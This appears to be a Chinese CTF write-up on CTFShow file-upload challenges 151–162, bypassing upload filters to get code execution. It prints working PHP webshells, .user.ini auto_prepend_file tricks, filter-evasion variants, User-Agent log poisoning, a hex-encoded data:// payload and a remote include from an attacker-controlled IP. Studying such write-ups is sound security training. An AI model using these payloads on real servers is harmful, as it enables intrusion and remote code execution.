# CTFSHOW 文件上传（151-170）
## 151
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951445972_image.png)
直接修改png为php

然后写一个文件一句话木马`<?php eval($_POST[1]);?>`

上传文件，`/upload/1.php`然后POST传参 ，flag在“../flag.php”

## 152
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951789432_image.png)
尝试上题操作，后端加了验证

将后缀改为png，可以上传，访问后图片是被包裹的
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951890503_image.png)
抓包，重放修改，后端对文件类型进行验证
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784952659681_image.png)
修改文件类型后，上传成功
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784952757421_image.png)
下面就是找目录，找flag

## 153
对文件名php进行过滤，大写可以绕过但是
文件名大写是不可以解析的必须小写。

发现在`/upload/`有index.php

可以利用`.user.ini` 是**PHP 专属的自定义配置文件**，属于目录级 PHP 配置，作用于当前文件夹及其所有子目录，仅对 PHP 生效

`.user.ini`中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入

利用`.user.ini`的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。
	
	auto_prepend_file = filename        //包含在文件头
	auto_append_file = filename         //包含在文件尾
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023060883_image.png)
上传`.user.ini`文件前要改一下前端的过滤

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022502325_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022111983_image.png)
传入2个文件，`.user.ini`用于包含`1.txt`,`1.txt`来被解析去执行一句话木马

访问/upload  是这样的话就成功了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022604146_image.png)
接下来就是post给1传值，在../发现flag


## 154
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023060883_image.png)
继续上题操作
在上传1.txt的时候
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023392799_image.png)
这题多了对文件内容的检测

二分法排除，对内容php进行检测，除了php还可以使用短标签，`php`->`=`
其他的不变。
访问/upload  是这样的话就成功了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022604146_image.png)
接下来就是post给1传值，在../发现flag

----
也可以使用`.phtml`作为后缀

`.phtml` 本质**就是 PHP 文件**，和 `.php` 功能完全一致，只是后缀不同。

----

155
-
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785191078253_image.png)

文件类型不合规

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785192944136_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785192952057_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785192948332_image.png)

156
-
用上题的pyload，文件内容又被过滤了`[]`,没有检查文件头

好了，这一题的`1.txt`可以这样写
```
<?=eval($_POST{1});?>
```
在这里`{ }`也可以代替`[ ]`

`.user.ini`:
```
auto_prepend_file = 1.txt
```
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785217045415_image.png)

157
-
这一题经过测试 对内容过滤了 `[ ]` `{ }` `;` `php`

所以1.txt可以这样写
```
<?= eval(array_shift($_POST)) ?>
```
1. PHP 只有多条语句才必须分号`;`单语句末尾省略 `;` 完全合法

2. `$_POST `本身是一个关联数组， POST 提交的参数会按提交顺序存入这个数组

3. array_shift($_POST) 取出数组POST的第一个元素,只能读取第一个POST 参数，参数顺序不能乱


`assert()` 是 PHP 断言函数，参数会被当作 PHP 代码直接执行，和 `eval()` 功能高度相似
```

assert(代码字符串)

assert("phpinfo()") // 等同于 eval("phpinfo();")，直接输出phpinfo
```

158
-
上题pyload可用

159
-
经过测试这次还要多过滤 `（）`

额，include包含日志文件，在日志文件中上传UA一句话木马

`<?=include '/var/lo'.'g/nginx/access.lo'.'g' ?>`

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785220001932_image.png)
配置文件成功包含1.txt，1.txt成功包含日志文件

然后写码，注意 写码只有一次机会
url/1.txt 在UA上写入`<?php eval($_POST[1])?>`会报错404，没关系，木马已经写入日志文件了。这里看不到404是因为跳转到了index.php（不重要）
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785220220728_image.png)
最后，就是RCE了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785220192876_image.png)

160
-
经过测试这次还要多过滤 `空格`但是不影响inclode包含日志文件

操作与上题一样，注意配置文件和1.txt的空格就行
1.txt`<?=include'/var/lo'.'g/nginx/access.lo'.'g'?>`
.user.ini`auto_prepend_file=1.txt`
161
-
这次上传`.user.ini`显示文件类型不合规。
长时间去找，发现`GIF89a`文件头 png类型 可以上传

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222818942_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222792700_image.png)

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222752201_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222778027_image.png)


162
-
文件内容不能有点`.` 用无后缀的文件。目前过滤`php` `{}` `[]` `()` `;` `空格` `.` 

上传配置文件
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785223747558_image.png)

-------

日志包含：
远程包含调用

由于过滤了. 所以使用远程包含

1. 将木马上传至远程服务器，由于过滤了. 所以需要转换下，mm

<?php eval($_POST[x]);?>
或者
<?php system('cat ../f*');?>
2. 上传包含文件 .user.ini

GIF89a
auto_prepend_file=txt
3. 上传远程调用文件 txt IP转数字

GIF89a
<?=include"http://数字IP/mm"?>
4. 访问upload

----
data伪协议绕过

payload构造：GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?右尖括号

在include可以使用的前提下，利用伪协议执行代码。将我们的代码<?php system($_GET['cmd']);进行字符串转义来绕过即可。

上传一个文件png，内容为GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?右尖括号

再上传一个文件.user.ini，内容为

GIF89a auto_prepend_file = png

最后访问/upload/?cmd=cat ../flag.php即可

fu

-----














